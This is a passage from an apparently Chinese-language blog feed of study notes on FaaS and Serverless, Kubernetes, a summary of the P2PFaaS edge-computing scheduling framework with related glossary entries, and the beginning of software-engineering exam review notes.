Serverless</h3><p>FaaS是一种云计算模型，其中开发者可以编写和部署独立的函数（代码块），并通过云服务提供商的平台执行这些函数。FaaS允许开发者根据需要执行函数，而无需管理底层的服务器和基础设施。每个函数都是独立的、无状态的，以事件驱动的方式触发执行。开发者只需关注函数的实现，而不用担心服务器的管理和扩展性。</p><p>Serverless是一种更广泛的概念，它是构建在FaaS模型之上的。Serverless强调开发者无需关心服务器和基础设施，只需专注于编写代码和业务逻辑。在Serverless架构中，云服务提供商负责自动扩展和管理底层的资源。开发者只需支付根据函数执行时间和资源消耗计算的费用，而无需事先预留或管理服务器。</p><p>FaaS和Serverless提供了更灵活、可扩展的开发和部署方式，使开发者能够更专注于核心业务逻辑而不必担心基础设施的细节。它们在构建微服务、事件驱动应用和处理短暂任务等场景中得到广泛应用，为开发者提供了高度可伸缩、成本效益高的解决方案。</p><h3 id="%E6%97%A0%E7%8A%B6%E6%80%81faas" tabindex="-1">无状态FaaS</h3><ul><li>无状态FaaS指的是函数即服务（FaaS）模型中的一种特性，即函数本身不存储任何状态信息。在无状态FaaS中，每个函数都是独立的、无状态的，它们被设计成接收输入参数并生成输出结果，而不会在函数之间保留任何状态信息。</li><li>这种设计有助于实现函数的高度可伸缩性和灵活性。由于函数本身不存储状态，它们可以独立地扩展和部署，而无需关心底层的服务器和基础设施。此外，无状态函数对于并行执行和容错性也更具优势，因为它们之间没有任何依赖或共享状态。</li><li>然而，无状态FaaS也意味着对于那些需要在函数之间共享和保持状态的应用程序来说，需要依赖外部服务（例如存储或数据库）来管理和存储状态信息。因此，无状态FaaS适用于那些可以通过函数的输入和输出进行完全描述的简单任务或短期计算，而对于复杂的应用程序或需要持久状态的任务，则可能需要其他机制来处理状态管理和共享。</li></ul><h3 id="k8s" tabindex="-1">K8s</h3><ul><li>Kubernetes（通常简称为K8s）是一个开源的容器编排平台，用于自动化部署、扩展和管理容器化应用程序。它提供了一组强大的功能和工具，帮助用户简化容器化应用程序的部署、扩展和运维工作。</li><li>以下是Kubernetes的一些主要特性和概念：<ul><li>容器编排：Kubernetes可以管理和编排容器化的应用程序，使其能够高效地运行在集群中的多个节点上。它可以自动在集群中的节点之间调度容器，并确保应用程序的高可用性和负载均衡。</li><li>自动伸缩：Kubernetes允许根据应用程序的负载情况自动扩展或缩减应用程序的副本数量。这样可以根据实际需求来调整资源的使用，以保证应用程序的性能和可用性。</li><li>服务发现和负载均衡：Kubernetes提供了内建的服务发现机制，可以为应用程序提供稳定的网络地址。同时，它还可以通过负载均衡来分发流量，确保应用程序能够平均地处理请求。</li><li>配置和存储管理：Kubernetes提供了灵活的配置管理机制，可以将应用程序的配置信息与容器分离，使得配置的修改和更新更加方便。此外，Kubernetes还支持多种存储选项，包括持久化存储和临时存储。</li><li>自愈和自修复：Kubernetes具备自愈和自修复的能力，当应用程序出现故障或节点失效时，它可以自动重新启动容器、替换故障节点，并确保应用程序的正常运行。</li><li>扩展性和可插拔性：Kubernetes的设计具有良好的扩展性和可插拔性，可以根据需要添加新的功能和组件。它提供了丰富的API和扩展点，允许开发人员根据自己的需求进行定制和扩展。</li></ul></li><li>总的来说，Kubernetes为容器化应用程序的部署、管理和运维提供了一套完整的解决方案。它可以帮助用户简化复杂的容器编排任务，并提供高可用性、弹性伸缩和自动化管理等功能，使得应用程序能够更加高效和可靠地运行在分布式环境中。</li></ul><h3 id="mininet" tabindex="-1">Mininet</h3><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 边缘计算 </tag>
            
            <tag> Faas </tag>
            
            <tag> ServerLess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>P2PFaaS</title>
      <link href="/2023/06/03/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/P2PFaaS/"/>
      <url>/2023/06/03/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/P2PFaaS/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.sciencedirect.com/science/article/pii/S2352711022002084">论文连接</a></p><h2 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h2><p>在边缘和雾计算环境中，通常会设计和测试实施调度和负载均衡解决方案的分布式算法。通常适用于该环境的操作范式要求用户调用最近的节点来执行任务，并且由于服务必须在一组节点之间分布，使用FaaS（函数即服务）的无服务器范式是最有前景的策略。基于这些前提条件，我们设计并实现了一个名为P2PFaaS的框架。该框架基于Docker容器构建，允许在一组节点之间实现完全分散的调度或负载均衡算法。通过依赖三个基本服务，即调度服务、发现服务和学习器服务，该框架允许实现任何类型的调度解决方案，即使基于强化学习。最后，该框架提供了一个即插即用的解决方案，可以在x86服务器和基于ARM的边缘节点（例如树莓派）上安装和测试。</p><h2 id="%E8%BD%AF%E4%BB%B6%E6%8F%8F%E8%BF%B0" tabindex="-1">软件描述</h2><h3 id="1.1-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84" tabindex="-1">1.1 软件架构</h3><p><img src="/images/%E8%AE%BA%E6%96%87/P2PFaaS/%E6%9E%B6%E6%9E%84%E5%9B%BE.png" alt></p><ul><li>调度器服务在端口18080上监听，并作为框架的入口，客户端可以通过REST API请求执行函数。</li><li>学习器服务在端口19020上监听，并实现了用于调度器服务进行调度决策的强化学习模型的训练和推断。</li><li>发现服务在端口19000上监听，并实现了节点的发现。</li></ul><h3 id="1.2-%E6%93%8D%E4%BD%9C%E6%B5%81%E7%A8%8B" tabindex="-1">1.2 操作流程</h3><p><img src="/images/%E8%AE%BA%E6%96%87/P2PFaaS/%E6%93%8D%E4%BD%9C%E6%B5%81%E7%A8%8B.PNG" alt></p><ol><li>客户端调用URL请求执行一个函数</li><li>采取操作（这里如果配置了基于RL的调度器，需将当前状态传递给 学习器服务，然后获得操作）</li><li>开始操作<ol><li>可将请求转发到另一节点，通过http来调用</li><li>可将请求加入本地队列等待执行</li><li>拒绝请求</li></ol></li><li>最终的函数执行通过向函数的容器发出http来调用，执行完毕后，输出数据转发给客户端</li><li>如果调度器基于RL，此时可进行模型的训练，调整模型参数</li></ol><h4 id="%E8%B0%83%E5%BA%A6%E6%9C%8D%E5%8A%A1" tabindex="-1">调度服务</h4><p>调度器模块是用Go语言编写的。选择这种编程语言是因为它专门为Web服务器的开发而设计。<br><img src="/images/%E8%AE%BA%E6%96%87/P2PFaaS/%E8%B0%83%E5%BA%A6%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84.jpg" alt></p><ul><li><p>API模块：API模块在调度器服务中扮演重要角色，它处理来自客户端的API请求。</p><ul><li>首先，它负责准备函数执行请求，包括根据请求参数和配置信息构建请求，并将其传递给实际的调度器进行处理。</li><li>其次，API模块还负责为配置更新准备有效载荷，即根据客户端的请求更新调度器的配置信息。</li></ul></li><li><p>调度服务容器启动时，会启动两个线程</p><ul><li>Web服务器线程：负责处理HTTP API调用</li><li>工作线程：负责管理内部任务队列</li></ul></li><li><p>调度器模块</p><ul><li>设计目的：允许调度算法的可互换性，为此设置了调度接口，可以完成调度算法的实例化和配置<pre><code class="language-Go">type scheduler interface &#123;GetFullName() stringGetScheduler() *types.SchedulerDescriptorSchedule(req *types.ServiceRequest) (*JobResult, error)&#125;</code></pre></li><li>调度函数实现对函数执行请求的有效调度，可以采取三种可能操作<ul><li>拒绝请求：返回HTTP错误码500并关闭客户端请求</li><li>在当前节点执行请求：在本地进行排队</li><li>将请求转发到其它节点：再次使用调度函数来调度请求，但这次请求标记为“External”，请求的转发通过&quot;API/Peer&quot;模块实现</li></ul></li></ul></li><li><p>队列模块：限制并行运行函数的数量，通常所说的节点中可以执行的并行任务数量的参数称为K。队列由一个实现生产者-消费者模式的线程管理。</p><ul><li>采用上述方式实现的队列限制了并行性，针对没有相关计算能力的边缘设备</li><li>这种队列的设计与M/M/1/K和M/M/K/K队列模型相匹配，这些模型可以帮助设计者确定最佳的系统参数，以实现所需的性能和可靠性。</li></ul></li><li><p>FaaS管理器模块：负责将函数执行请求转发到正确的FaaS函数容器。</p><ul><li>该模块允许进一步解耦，可以使用不同的FaaS容器技术</li><li>Docker自动完成将容器名称转换为FaaS容器的IP地址名称解析</li><li>该模块保证请求被正确地路由到相应的FaaS容器，从而实现高效的函数执行。</li></ul></li><li><p>配置器模块：管理启动时的配置（称为 “静态”）和运行时的配置（称为 “动态”）</p></li><li><p>日志模块：过多的日志记录可能会减慢服务速度并增加任务的延迟</p></li><li><p>调度器服务模块和学习器服务模块：实现服务间的交互</p></li></ul><h4 id="%E5%AD%A6%E4%B9%A0%E5%99%A8%E6%9C%8D%E5%8A%A1" tabindex="-1">学习器服务</h4><p><img src="/images/%E8%AE%BA%E6%96%87/P2PFaaS/%E5%AD%A6%E4%B9%A0%E5%99%A8%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84.jpg" alt></p><ul><li><p>该服务实现强化学习模型，用于进行调度决策</p></li><li><p>强化学习模型分为三个实体</p><ul><li>状态：以字符串形式编码，包含当前节点的负载</li><li>动作：被映射为调度动作</li><li>奖励：奖励驱动学习过程，可以取决于总任务的时间<ul><li>例如，如果任务在特定时间完成，可以给予正面奖励，为此，需要客户端能够训练模型，因为只有当函数输出到达客户端才能知道最终延迟</li></ul></li></ul></li><li><p>学习实体：封装成一个数据结构，包括</p><ul><li>EID：一个递增的编号</li><li>状态：一个字符串</li><li>动作：一个浮点数</li><li>奖励：一个浮点数</li></ul></li><li><p>学习线程：学习过程由学习线程执行，它负责在所有所需的实体都存在时延迟训练。（这里不是很懂强化学习）</p></li><li><p>训练模型：跳了</p></li></ul><h4 id="%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1" tabindex="-1">发现服务</h4><ul><li>使用Go语言编写，目的是让节点了解他的邻居。</li><li>该服务基于八卦算法（gossip algorithm）在启动时必须通过另一个节点的IP（称为“初始服务器”）进行配置。</li></ul><h2 id="%E5%BD%B1%E5%93%8D" tabindex="-1">影响</h2><ul><li><p>这项工作中提出的P2PFaaS框架可能是第一个开源可用的框架，它通过采用完全去中心化（对等）方案，实现了节点之间的分布式调度和负载平衡算法的实现。</p></li><li><p>该框架对于该领域的研发人员(设计和测试实施调度和负载均衡解决方案的分布式算法),可以用于测试设计的算法是否能够在真实设备上进行可能的实现，，以及在哪些条件下它们可以工作</p></li><li><p>由于代码的可移植性，P2PFaaS也很容易在多个SoC计算机（如树莓派）上部署，通过利用OpenBalena来避免使用虚拟机，以便在真实计算机设备上测试算法</p></li><li><p>在真实设备上测试这种类型的算法对研究和特别是算法设计有明显的影响。真实环境的一系列条件和特殊特征往往无法通过模拟和数学模型轻易掌握。</p></li></ul><h2 id="%E7%BB%93%E8%AE%BA" tabindex="-1">结论</h2><ul><li><p>本论文中，我们介绍了P2PFaaS框架，这是一个软件套件，可用于在一组真实节点之间测试和评估调度和负载均衡算法。我们展示了该框架的基本特点，包括模块化、可移植性以及通过设计的接口轻松更改核心调度算法的可能性。我们还详细介绍了组成框架的三个服务：调度器、学习器和发现服务。</p></li><li><p>对该框架的进一步改进主要朝着两个方向进行。</p><ul><li>第一个方向是改进服务迁移的管理，通过支持动态函数分配和可用性来实现。</li><li>第二个方向涉及绿色边缘计算，目前正在开发额外的模块，以允许评估考虑节点能量方面的调度和负载均衡算法。</li></ul></li></ul><h2 id="%E4%B8%93%E6%9C%89%E5%90%8D%E8%AF%8D%E7%90%86%E8%A7%A3" tabindex="-1">专有名词理解</h2><h3 id="%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97%E5%92%8C%E9%9B%BE%E8%AE%A1%E7%AE%97" tabindex="-1">边缘计算和雾计算</h3><ul><li><p>边缘计算（Edge Computing）侧重于将计算和数据处理推向物理世界的边缘，即接近数据生成源头的位置。边缘计算将计算任务和数据处理分布在边缘设备、边缘节点或边缘服务器上，以实现低延迟、实时性和快速响应的数据处理。它强调将计算资源尽可能靠近数据源，以减少数据传输延迟和网络拥塞，并支持一些特定的边缘应用场景，如智能交通、物联网、智能工厂等。边缘计算更注重在边缘节点上进行本地计算和决策，将关键的数据处理任务尽可能地下沉到边缘，减少对云端的依赖。</p></li><li><p>雾计算（Fog Computing）是一种介于边缘和云之间的计算模型，弥补了边缘设备和云数据中心之间的距离。雾计算引入了中间层的雾节点（Fog Node）或边缘节点（Edge Node），这些节点位于边缘设备和云数据中心之间，用于处理边缘设备生成的数据和提供边缘服务。雾计算的目标是解决传统云计算模型中的一些挑战，如高延迟、带宽限制和网络拥塞。它通过将计算和存储资源推向边缘，减少数据传输到云端的时间，提供更快速的数据处理和更高带宽的支持。</p></li><li><p>虽然边缘计算和雾计算有一些相似之处，例如将计算资源放置在边缘设备附近、提供低延迟的数据处理等，但也存在一些区别：</p><ul><li><p>范围和位置：边缘计算更注重在物理世界的边缘部署计算资源，即离数据生成源头较近的位置。而雾计算更关注于边缘设备和云数据中心之间的中间层，即雾节点，这些节点位于边缘和云之间的位置。</p></li><li><p>任务分发和处理：边缘计算侧重于在边缘节点上进行本地计算和决策，将关键的数据处理任务下沉到边缘。而雾计算更倾向于在雾节点上进行边缘设备生成数据的处理和分析，同时提供边缘服务。</p></li><li><p>应用场景：边缘计算更适用于对实时性、低延迟和快速响应有较高要求的应用场景，如智能交通、物联网等。而雾计算更关注于在边缘设备和云之间提供更灵活和高效的计算模型，适用于智能城市、工业物联网等场景。</p></li></ul></li></ul><p>综上所述，边缘计算和雾计算都是为了满足分布式计算需求而提出的模型，它们在计算资源的位置、任务分发和处理方式以及适用的应用场景上有一些不同。根据具体的应用需求和场景特点，可以选择合适的计算模型来满足需求。</p><h3 id="websocket%E6%B1%A0" tabindex="-1">WebSocket池</h3><ul><li><p>WebSocket池（WebSocket Pool）是一种管理和复用WebSocket连接的机制。在使用WebSocket与服务器进行实时通信时，每次创建和关闭WebSocket连接都会产生一定的开销，特别是在高并发场景下，频繁创建和关闭连接可能会对服务器的性能和资源造成负担。</p></li><li><p>为了避免频繁地创建和关闭WebSocket连接，可以使用WebSocket池来管理这些连接。WebSocket池维护一组预先创建的WebSocket连接，并在需要时将连接提供给应用程序使用，而不是每次都重新创建连接。当应用程序完成使用后，连接会被放回池中，以备下次使用。</p></li><li><p>WebSocket池的好处包括：</p><ul><li>减少连接创建和关闭的开销：通过复用连接，可以减少每次创建和关闭连接所需的时间和资源消耗，提高服务器的性能和资源利用率。</li><li>提高响应速度：由于连接已经建立，可以立即开始进行通信，而不需要等待连接建立的时间，从而减少了通信的延迟。</li><li>控制连接数：通过维护连接池，可以限制并发连接的数量，避免服务器过载或资源耗尽的情况发生。</li></ul></li></ul><h3 id="go%E8%AF%AD%E8%A8%80" tabindex="-1">Go语言</h3><ul><li>Go语言（也称为Golang）是一种开源编程语言，由Google开发。它具有高效的并发性能和内置的网络库，使其非常适合构建高性能的Web服务器和分布式系统。Go语言的设计目标之一是简单易用，同时也注重代码的可读性和可维护性。</li><li>调度器模块的编写采用Go语言，这意味着该模块可以利用Go语言的特性和生态系统，快速地处理并发请求、提供网络服务，并具备良好的性能和可靠性。通过使用Go语言编写调度器模块，可以更容易地构建可扩展的、高效的Web服务器，并实现可靠的任务调度和资源分配功能。</li></ul><h3 id="m%2Fm%2F1%2Fk%E5%92%8Cm%2Fm%2Fk%2Fk%E9%98%9F%E5%88%97%E6%A8%A1%E5%9E%8B" tabindex="-1">M/M/1/K和M/M/K/K队列模型</h3><p>M/M/1/K和M/M/K/K队列模型是用于描述排队系统的数学模型。</p><ul><li>其中&quot;M&quot;代表到达率和服务率都是随机的泊松分布，&quot;1&quot;代表只有一个服务台，&quot;K&quot;代表系统容量，即队列的最大长度。当队列长度达到K时，新到达的请求将被拒绝。</li><li>在M/M/K/K模型中，&quot;K&quot;代表服务台的数量，即系统可以同时服务的最大请求数量。</li><li>这些模型可以用于评估系统的性能，并帮助设计者确定最佳的系统参数，以实现所需的性能和可靠性。</li></ul><h3 id="%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0" tabindex="-1">强化学习</h3><ul><li>强化学习（Reinforcement Learning）是一种机器学习的分支，其目标是通过代理与环境的交互来学习最优行为策略。在强化学习中，代理通过观察环境的状态并执行动作，从环境中接收奖励信号来评估其行为的好坏，然后根据奖励信号调整其策略，以最大化长期累积奖励。</li><li>强化学习的核心概念包括状态（State）、动作（Action）、奖励（Reward）和策略（Policy）：<ul><li>状态（State）：代表环境的当前情况或特征。它可以是离散的或连续的，并且通常由观察到的环境信息来表示。</li><li>动作（Action）：代理在给定状态下可以执行的操作或决策。动作可以是离散的或连续的，具体取决于问题的性质。</li><li>奖励（Reward）：代表代理在执行动作后从环境中获得的即时反馈。奖励可以是正面的、负面的或零，用于指导代理的学习过程。</li><li>策略（Policy）：代理的策略定义了在给定状态下选择动作的方式。策略可以是确定性的（确定选择一个动作）或概率性的（以一定概率选择不同的动作）。</li></ul></li><li>强化学习的核心挑战是在未知环境中通过与环境的交互来学习最优策略。代理通过尝试不同的动作，并根据获得的奖励信号来调整策略。在学习过程中，代理会通过探索（Exploration）和利用（Exploitation）的权衡来平衡对新动作的探索和对已知高奖励动作的利用。</li><li>强化学习方法包括基于值函数的方法（如Q-learning和Sarsa）和基于策略的方法（如Policy Gradient和Actor-Critic）。近年来，深度强化学习（Deep Reinforcement Learning）结合了深度神经网络和强化学习的方法，使得代理能够从原始感知输入中学习，并在复杂的任务中取得了重大突破。</li><li>强化学习在许多领域有着广泛的应用，包括机器人控制、游戏玩法、自动驾驶、金融交易等。它具有通过与环境的交互学习最优策略的能力，使得它成为解决许多复杂问题的有效工具。</li></ul><h3 id="%E5%85%AB%E5%8D%A6%E7%AE%97%E6%B3%95%EF%BC%88gossip-algorithm%EF%BC%89" tabindex="-1">八卦算法（gossip algorithm）</h3><ul><li>八卦算法（Gossip Algorithm）是一种分布式算法，用于在一个大规模的系统中进行信息传播和共享。它的设计灵感来源于人们在日常生活中进行谣言传播的行为，因此得名为&quot;八卦算法&quot;。</li><li>八卦算法的基本思想是通过节点之间的随机通信来传播信息。每个节点都维护一个局部的信息视图，包含了一部分已知节点的信息。在每一轮通信中，节点随机选择一个邻居节点，并向其发送自己所知道的信息。接收节点会将发送节点的信息与自己已知的信息进行合并，并将自己所知的信息继续传播给其他随机选择的邻居节点。通过不断的随机通信和信息传播，整个系统中的节点逐渐将信息进行共享，从而达到全局信息的一致性。</li><li>八卦算法的特点和优势包括：<ul><li>去中心化：八卦算法不依赖于中心节点或全局控制节点，每个节点都可以进行信息的传播和接收，从而实现了去中心化的通信和共享。</li><li>随机性：算法中的随机选择邻居节点的步骤使得信息能够快速传播到整个系统中，同时避免了某些节点成为瓶颈或集中点。</li><li>容错性：八卦算法具有一定的容错性，即使在系统中存在一些故障节点或通信延迟，整个系统仍然能够保持信息的传播和一致性。</li><li>可扩展性：八卦算法适用于大规模系统，随着节点数量的增加，算法的性能和效果并不会显著下降。</li></ul></li><li>八卦算法在分布式系统中有广泛的应用，例如数据复制、一致性维护、状态同步等。它提供了一种简单而有效的方式来实现节点之间的信息共享和传播，并在分布式环境中实现了一致性和可靠性。</li></ul><h3 id="soc%E8%AE%A1%E7%AE%97%E6%9C%BA" tabindex="-1">Soc计算机</h3><ul><li><p>SoC（System-on-a-Chip）计算机是一种集成了处理器、内存、存储、通信接口和其他相关组件的单芯片计算机系统。它将多个功能单元集成到一个芯片上，具有较小的尺寸和较低的功耗。SoC计算机通常用于嵌入式系统、移动设备和物联网应用中，因为它们提供了高度集成和高效的计算能力。</p></li><li><p>树莓派（Raspberry Pi）是一种知名的SoC计算机，由树莓派基金会开发。它以其低成本、小巧的尺寸和广泛的可扩展性而受到广泛关注。树莓派计算机具有基于ARM架构的处理器、内存、存储、通信接口和各种输入输出端口，可以运行不同的操作系统和应用程序。由于其易于使用和开放的设计，树莓派成为学习计算机科学和物联网开发的理想平台之一。</p></li></ul><h3 id="openbalena" tabindex="-1">OpenBalena</h3><ul><li>OpenBalena是一个开源的物联网平台，用于管理和部署容器化应用程序到大规模的嵌入式设备集群，其中包括树莓派等SoC计算机。它是Balena（<a href="http://xn--Resin-dq1hk7vmw4k.io">前身为Resin.io</a>）的开源版本，旨在提供一个灵活的解决方案，使开发者能够轻松地管理和远程部署应用程序到物联网设备。</li><li>通过OpenBalena，用户可以创建和管理设备群组、监控设备状态、远程部署应用程序、执行设备管理任务等。它提供了一套完整的工具和API，使得将应用程序部署到物联网设备变得简单和可扩展。</li><li>使用OpenBalena可以极大地简化物联网设备的管理和部署过程，尤其对于大规模的设备集群而言。它提供了可视化的界面和命令行工具，使用户能够轻松地管理和监控设备，同时支持自动化部署和更新应用程序。</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 边缘计算 </tag>
            
            <tag> 雾计算 </tag>
            
            <tag> Faas </tag>
            
            <tag> ServerLess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件工程期末突击</title>
      <link href="/2023/05/23/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/"/>
      <url>/2023/05/23/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="%E7%AC%AC%E4%B8%80%E7%AB%A0-%E4%BB%8E%E7%A8%8B%E5%BA%8F%E5%88%B0%E8%BD%AF%E4%BB%B6" tabindex="-1">第一章 从程序到软件</h2><h3 id="1-%E4%BD%95%E4%B8%BA%E7%A8%8B%E5%BA%8F%E5%8F%8A%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%B4%A8%E9%87%8F%E8%A6%81%E6%B1%82" tabindex="-1">1 何为程序及程序的质量要求</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BD%95%E4%B8%BA%E7%A8%8B%E5%BA%8F" tabindex="-1">（1）何为程序</h4><ul><li>程序（Program）是由程序设计语言所描述的、能为计算机所理解和处理的一组语句序列</li><li>程序严格遵循程序设计语言的各项语法和语义规定</li><li>程序代码可表现为二种形式<ul><li>源代码（Source Code）：用程序设计语言所描述的代码</li><li>可执行代码（Executable Code）：可执行的二进制或中间码</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89-%E7%A8%8B%E5%BA%8F%E7%BB%84%E6%88%90" tabindex="-1">（2） 程序组成</h4><ul><li>语句：声明、定义、控制、计算等；实现特定的功能；</li><li>模块：包，类，方法；每个模块实现特定功能</li></ul><h4 id="%EF%BC%883%EF%BC%89%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BA%8C%E7%B1%BB%E5%88%A9%E7%9B%8A%E7%9B%B8%E5%85%B3%E8%80%85" tabindex="-1">（3）程序的二类利益相关者</h4><ul><li>用户：<ul><li>程序的运行展示 <strong>功能和性能</strong></li><li>满足和实现用户的<strong>需求</strong></li></ul></li><li>程序员<ul><li>编写，阅读维护程序</li><li>发现和修改程序中的缺陷</li></ul></li><li>用户和程序员对程序有这不同的质量需求</li></ul><h4 id="%EF%BC%884%EF%BC%89%E7%A8%8B%E5%BA%8F%E8%B4%A8%E9%87%8F%E7%9A%84%E5%86%85%E5%9C%A8%E5%92%8C%E5%A4%96%E5%9C%A8%E4%BD%93%E7%8E%B0" tabindex="-1">（4）程序质量的内在和外在体现</h4><ul><li>外在(External)质量<ul><li>用户视点</li><li>对外可展示，用户可直接感触到、所关心的</li><li>使用流畅性、响应速度、界面美观、操作简易性、运行可靠性等</li></ul></li><li>内在(Internal)质量<ul><li>程序员视点</li><li>体现在程序的内在方面，程序员可以感触到的、所关心的</li><li>易于理解、结构清晰、易于修改、可重用好等</li></ul></li></ul><h3 id="2-%E7%A8%8B%E5%BA%8F%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81%E6%96%B9%E6%B3%95" tabindex="-1">2 程序质量保证方法</h3><ul><li>程序质量保证方法<ul><li>遵循编码风格</li><li>采用程序设计方法</li><li>开展代码重用</li><li>进行结对编程</li><li></li></ul></li></ul><h4 id="%EF%BC%881%EF%BC%89%E7%A8%8B%E5%BA%8F%E8%B4%A8%E9%87%8F%E7%9A%84%E8%AF%AD%E6%B3%95%E5%92%8C%E8%AF%AD%E4%B9%89%E4%BD%93%E7%8E%B0" tabindex="-1">（1）程序质量的语法和语义体现</h4><ul><li>代码风格规范-语法<ul><li>语法和结构层次</li><li>明确如何来规范程序的书写</li><li>表现为是否易于阅读和理解</li></ul></li><li>代码设计规范-语义<ul><li>语义和内涵层次，外在的</li><li>明确如何来组织和封装程序语句</li><li>表现为良好的结构和易于重用</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E9%81%B5%E5%BE%AA%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC" tabindex="-1">（2）遵循编码风格</h4><ul><li>良好的编程行为：对代码符号进行良好的组织、合理的命名、提供必要的注释，那么将可增强代码的可读性和可理解性，进而提高代码的可维护性和可重用性，提升代码的内部质量</li><li>编码风格：程序员在编码时要遵循特定的样式及要求，以规范程序员的编程行为以及所产生程序代码的样式</li><li>编写代码的基本原则<ul><li>易懂，一看就懂</li><li>简明，降低复杂度</li><li>易改，便于维护</li><li>无二义，不产生歧义</li></ul></li><li>代码风格举例：<ul><li>代码布局：缩进，大括号换行</li><li>代码组织：按字母顺序说明对象，单入口单出口</li><li>命名规范：一看就懂，望文生义；小驼峰，大驼峰</li><li>代码注释：有效、必要、简洁的注释；注解位置</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E9%87%87%E7%94%A8%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95" tabindex="-1">（3）采用程序设计方法</h4><ul><li>语句设计<ul><li>单入口单出口，少用goto语句</li><li>加强对异常处理<ul><li>将更多的时间和精力放在处理异常代码上</li></ul></li></ul></li><li>模块化设计<ul><li>模块是逻辑上相对独立、具有良定义接口的编程单位</li><li>模块可表现为函数、过程、方法、类、程序包等</li></ul></li><li>高内聚低耦合原则<ul><li>高内聚：模块内各要素紧密相关，仅实现单一功能，否则再进行拆分</li><li>低耦合：模块间的关系应设计的非常松散</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8" tabindex="-1">（4）代码重用</h4><p>定义：在编写代码过程中，充分利用已有和现成的代码，并将其集成到程序之中，从而来实现程序功能<br>好处：由于被重用的代码经过多次反复的使用，代码质量得到充分检验，因而代码重用不仅可极大提高编程效率，而且还可有效提高程序质量</p><ul><li>重用代码片段</li><li>重用函数、类和软构件</li><li>重用开源代码</li></ul><h4 id="%EF%BC%885%EF%BC%89%E7%BB%93%E5%AF%B9%E7%BC%96%E7%A8%8B" tabindex="-1">（5）结对编程</h4><h3 id="3-%E7%A8%8B%E5%BA%8F%E8%B4%A8%E9%87%8F%E7%9A%84%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95" tabindex="-1">3 程序质量的分析方法</h3><ul><li>人工审查方法</li><li>自动化分析方法</li><li>程序测试方法</li></ul><h4 id="%EF%BC%881%EF%BC%89%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%BD%9C%E5%9C%A8%E7%9A%84%E8%B4%A8%E9%87%8F%E9%97%AE%E9%A2%98" tabindex="-1">（1）程序代码中潜在的质量问题</h4><ul><li>质量问题<ul><li>编写不合理 – 没有遵循编码规范</li><li>设计不合理 – 没有遵循设计规范</li><li>代码有错误 – 代码编写的不正确</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BA%BA%E5%B7%A5%E5%AE%A1%E6%9F%A5%E4%BB%A3%E7%A0%81%EF%BC%88code-review%EF%BC%89" tabindex="-1">（2）人工审查代码（Code Review）</h4><ul><li>方法描述:阅读和理解代码；发现缺陷和问题；提出改进的建议</li><li>方法特点：人工审查效率低；难以发现一些深层次问题；难以全面地进行系统分析</li><li>审查方面：<ul><li>代码是否符合编程规范</li><li>代码中是否存在缺陷</li><li>从质量的角度哪些代码需要改进</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E5%AE%A1%E6%9F%A5-%E4%BB%A3%E7%A0%81%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90" tabindex="-1">（3）自动化工具审查-代码静态分析</h4><ul><li><p>由计算机软件来自动完成代码审查</p><ul><li>无需运行被测代码，仅通过分析或检查程序的语法、结构、过程、接口等来检查程序</li><li>30% - 70% 的代码缺陷可通过静态分析发现</li></ul></li><li><p>分析什么</p><ul><li>找出代码隐藏的错误和缺陷，如参数不匹配，有歧义的嵌套语句，错误的递归，非法计算，可能出现的空指针引用等等</li><li>程序遵循编码规范的程度</li></ul></li><li><p>特点：快速定位、有效发现隐藏的错误和缺陷</p></li><li><p>自动化代码分析工具：SonarQube</p><ul><li>基于Web、用于管理程序代码质量的代码分析工具</li><li><a href="http://www.sonarqube.org">www.sonarqube.org</a></li><li>能以插件的形式集成到众多的软件开发环境（如Eclipse）</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF" 